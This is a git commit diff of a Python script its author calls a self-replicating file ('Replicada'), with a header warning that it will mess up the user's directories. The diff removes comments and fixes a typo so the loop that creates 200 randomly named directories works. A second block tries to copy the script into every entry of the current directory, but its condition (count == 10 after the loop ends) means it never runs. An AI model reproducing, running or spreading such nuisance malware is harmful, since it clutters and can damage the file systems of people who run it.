8d19f10981e1eb8154e593385ee0dfe1f33e51df
Kamilla Youver / Archisha <95626487+archisha69@users.noreply.github.com>
2022-09-01 16:19:52 +0800

    Update main.py

--- main.py
+++ main.py
@@ -7,23 +7,23 @@ PLEASE MIND THAT THIS WOULD FUCK UP YOUR DIRECTORIES, INCLUDING FILES AND FOLDER
 self-replicating python file - Replicada by archisha69
 '''
 
-import os, shutil, time, random, string #imports modules
+import os, shutil, time, random, string
 
-sep = "\\" if os.name == "nt" else "/" #get path seperator
-cwd = os.getcwd() #get current working directory
+sep = "\\" if os.name == "nt" else "/"
+cwd = os.getcwd()
 
-count = 0 #counter
+count = 0
 
-while count < 200: #this will loop 200 times
-    name = ''.join(random.choices(string.ascii_letteers + string.digits, k=random.randint(2, 32))) #random string generator
+while count < 200:
+    name = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2, 32)))
     time.sleep(1) #cooldown, lower the value to make the process faster, higher the value to make the process slower (prevent lags)
-    os.mkdir(f"{cwd}{sep}{name}{count}") #created directory name will be random printable characters
-    count += 1 #increases count everytime it creates a directory
+    os.mkdir(f"{cwd}{sep}{name}{count}")
+    count += 1
     
-if count == 10: #start self-replicating when count to 10
-    all = os.listdir(cwd) #returns a list of all current directories
-    for dir in all: #for every directories and files
-        if dir == "main.py": pass #failsafe, skip existed (this file) main.py in current directory, if you already have 1 file named "main.py" in current working directory (cwd), please change the name of this file and change "main.py" in this line to this file's name after changes
-        else: #i dont think you can copy main.py to main.py, right? (i mean it technically can)
-            time.sleep(1) #cooldown, as same as the previous one
-            shutil.copy(f"{cwd}{sep}main.py", dir) #copies itself to all directories in cwd
+if count == 10:
+    all = os.listdir(cwd)
+    for dir in all:
+        if dir == "main.py": pass #skip existed (this file) main.py in current directory, if you already have 1 file named "main.py" in current working directory (cwd), please change the name of this file and change "main.py" in this line to this file's name after changes
+        else:
+            time.sleep(1)
+            shutil.copy(f"{cwd}{sep}main.py", dir) #copies itself (remember to change file name) to all directories in cwd
